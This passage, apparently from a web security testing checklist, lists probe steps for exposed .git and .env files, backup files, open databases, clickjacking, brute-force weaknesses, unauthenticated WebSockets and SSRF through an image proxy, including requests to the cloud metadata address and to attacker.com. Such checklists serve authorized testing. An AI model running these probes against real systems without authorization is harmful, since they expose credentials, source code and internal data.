Traffic Interception: Use a proxy to capture app traffic. If secrets are sent in plain text, it confirms the issue.
Obfuscation Check: Check if secrets are obfuscated. If easily decoded (e.g., base64), it’s exploitable.

Debugging Info in Error Messages

Error Triggering: Submit invalid input (e.g., malformed JSON) to an API. If stack traces or DB info are returned, it’s vulnerable.
500 Error Testing: Cause a server error (e.g., /api/test?id=invalid). If sensitive info is exposed, it confirms the issue.
Verbose Mode Testing: Add ?debug=true to an endpoint. If detailed errors are returned, it’s exploitable.

Server Reveals Stack Traces

Invalid Request: Send a malformed request (e.g., POST /api with invalid JSON). If a stack trace is returned, it’s vulnerable.
Exception Triggering: Access an invalid endpoint (e.g., /nonexistent). If the server returns a stack trace, it confirms the issue.
Parameter Error: Inject invalid parameters (e.g., id=-1). If stack traces are exposed, it’s exploitable.

Leak of Internal IP in Error Message

Error Page Analysis: Trigger an error (e.g., 404 or 500) and check the response for internal IPs (e.g., 10.0.0.1). If present, it’s vulnerable.
API Error Testing: Send an invalid API request and inspect the response. If internal IPs are exposed, it confirms the issue.
Header Leakage: Check error response headers for IPs (e.g., X-Server: 192.168.1.1). If found, it’s exploitable.

Leaking Sensitive Info in Analytics Scripts

Script Inspection: Check analytics scripts (e.g., /analytics.js) for sensitive data (e.g., user IDs, tokens). If present, it’s vulnerable.
Network Request Analysis: Monitor analytics requests for sensitive parameters (e.g., ?user_id=123). If sent, it confirms the issue.
Third-Party Exposure: If analytics scripts send data to third parties, check if sensitive info is included. If so, it’s exploitable.

Misconfigured .git Exposed

Direct Access: Try accessing / .git/config. If the Git config is returned, it’s vulnerable.
File Enumeration: Use tools like GitTools to extract files from / .git/. If source code is accessible, it confirms the issue.
Commit History: Access / .git/logs/HEAD. If commit history is exposed, it’s exploitable.

Accessible .env File

Direct Access: Request / .env. If environment variables (e.g., DB credentials) are returned, it’s vulnerable.
Case Variation: Try / .ENV or /env. If the file is accessible, it confirms the issue.
Backup Testing: Access / .env.bak. If a backup file is exposed, it’s exploitable.

Backup File Accessible (.bak)

File Guessing: Try /config.bak or /app.bak. If backup files are returned, it’s vulnerable.
Common Extensions: Test extensions like .backup, .old, or .bak1. If accessible, it confirms the issue.
Directory Listing: If directory listing is enabled, check for .bak files. If found, it’s exploitable.

Open Database Exposed (MongoDB, Redis)

Port Scanning: Scan for open ports (e.g., 27017 for MongoDB, 6379 for Redis). If accessible without auth, it’s vulnerable.
Direct Connection: Connect to the database (e.g., mongo <ip>:27017). If no credentials are required, it confirms the issue.
API Exposure: Check if an API exposes DB endpoints (e.g., /db/admin). If accessible, it’s exploitable.

Clickjacking Vulnerability

Iframe Testing: Create an HTML page with <iframe src="https://example.com/profile"></iframe>. If the page loads without X-Frame-Options, it’s vulnerable.
Header Check: Inspect responses for X-Frame-Options or CSP frame-ancestors. If missing, it confirms the issue.
Transparent Iframe: Use a transparent iframe over a button (e.g., form submission). If clicks are hijacked, it’s exploitable.

Lack of Brute-Force Protection

Password Brute-Forcing: Use Burp Intruder to try multiple passwords for a user. If no lockout occurs, it’s vulnerable.
API Brute-Forcing: Send rapid API login requests with different credentials. If unrestricted, it confirms the issue.
CAPTCHA Weakness: If CAPTCHA is present, check if it’s reusable or bypassable. If so, it’s exploitable.

Open WebSocket with No Auth

WebSocket Connection: Connect to a WebSocket (e.g., ws://example.com/socket) without auth. If connected, it’s vulnerable.
Message Injection: Send malicious messages via the WebSocket. If processed, it confirms the issue.
Unauthenticated Access: Try accessing the WebSocket with no session token. If successful, it’s exploitable.

Insecure Image Proxy

Internal URL Testing: Submit http://localhost:8080 to the image proxy. If internal data is returned, it’s vulnerable.
SSRF via Proxy: Try http://169.254.169.254/latest/meta-data/ via the proxy. If metadata is fetched, it confirms the issue.
Malicious URL: Use http://attacker.com/malicious.jpg. If the proxy fetches it without validation, it’s exploitable.

